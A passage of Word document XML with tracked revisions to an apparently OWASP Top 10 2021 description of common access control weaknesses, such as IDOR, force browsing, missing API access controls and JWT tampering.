    </w:p>
    <w:p w14:paraId="607E308D" w14:textId="7817858C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="315" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">performing a business function outside </w:t>
      </w:r>
      <w:del w:id="316" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:ins w:id="317" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> user's</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limits</w:t>
      </w:r>
      <w:del w:id="318" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the user</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. Common access</w:t>
      </w:r>
      <w:del w:id="319" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="641985A9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>control vulnerabilities include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42298893" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E69439F" w14:textId="396B37D5" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="320" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="321" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="322" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Violation of the principle of least privilege or deny by default,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="37540AE5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="323" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="324" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    where access should only be granted for particular capabilities,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2E32CEC1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="325" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="326" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    roles, or users, but is available to anyone.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E329A9A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="327" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2661F3A4" w14:textId="6149B67A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="328" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="329" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Bypassing access control checks by modifying the URL</w:t>
      </w:r>
      <w:del w:id="330" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="331" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> (parameter</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="16CCB16C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="332" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="333" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    tampering or force browsing),</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> internal application state, or the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BF43B7" w14:textId="2DAC0B0F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="334" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTML page, or </w:t>
      </w:r>
      <w:del w:id="335" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>simply</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="336" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>by</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> using </w:t>
      </w:r>
      <w:del w:id="337" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>a custom API</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="338" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>an</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack tool</w:t>
      </w:r>
      <w:ins w:id="339" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> modifying API requests</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5595A842" w14:textId="3C310256" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="340" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="341" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Allowing the primary key to be changed to another's users record, permitting</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6964D194" w14:textId="3F336673" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="342" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Permitting</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> viewing or editing someone else's account</w:t>
      </w:r>
      <w:del w:id="343" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="344" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>, by providing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5BC9004B" w14:textId="31EE0F03" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="345" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="346" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="347" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    its unique identifier (insecure direct object references)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="491D1BCE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="348" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CC09083" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="349" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="350" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Accessing API with missing access controls for POST, PUT and DELETE.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0274FA43" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="351" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CB19BCD" w14:textId="14C2B9A3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="352" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="353" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Elevation of privilege. Acting as a user without being logged in</w:t>
      </w:r>
      <w:del w:id="354" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B301E9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="355" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> acting as an admin when logged in as a user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025D0A7C" w14:textId="0D586A00" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="356" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="357" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4667EB6C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="358" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="359" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata manipulation, such as replaying or tampering with a JSON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BBF66CE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="360" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="361" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web Token (JWT) access control token</w:t>
      </w:r>
      <w:ins w:id="362" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or a cookie or hidden field</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D7ABC7" w14:textId="13E735EE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="363" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> manipulated to elevate privileges</w:t>
      </w:r>
      <w:del w:id="364" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or abusing JWT invalidation</w:t>
      </w:r>
      <w:ins w:id="365" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24E5BAF3" w14:textId="280C9A38" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="366" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="367" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1C41C4F6" w14:textId="06851703" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="368" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
